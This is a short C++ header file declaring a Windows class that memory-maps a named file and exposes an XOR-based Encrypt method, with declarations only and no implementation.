#pragma once
#include <windows.h>

class classzanak
{
private:
    HANDLE hFile;
    HANDLE hFileMapping;
    PBYTE p_mSourceFirstByte;
    LPWSTR p_chFileName;

    void XorEncryptDecrypt(DWORD fileSize);

public:
    classzanak(LPCWSTR fileName);
    ~classzanak();
    void Encrypt();
};